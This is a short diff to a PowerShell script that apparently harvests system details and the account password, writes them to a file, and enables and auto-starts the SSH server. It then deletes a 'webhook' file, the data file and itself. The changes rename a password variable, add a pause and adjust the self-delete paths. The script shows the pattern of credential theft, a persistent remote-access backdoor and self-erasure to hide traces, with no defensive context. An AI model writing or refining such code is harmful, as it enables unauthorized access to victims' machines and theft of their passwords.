@@ -67,7 +67,7 @@ Computer Name = $env:computername
 Computer Language = $language
 Location (country) = $country
 IP = $ip
-Account Password = $password
+Account Password = $pword
 "
 New-Item ./$env:computername.fk -Value (
   $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
@@ -98,7 +98,9 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
+pause
+
 ## Self Delete
-Remove-Item ./webhook
-Remove-Item ./"$env:computername.fk"
+Remove-Item webhook
+Remove-Item "$env:computername.fk"
 Remove-Item $PSCommandPath -Force 
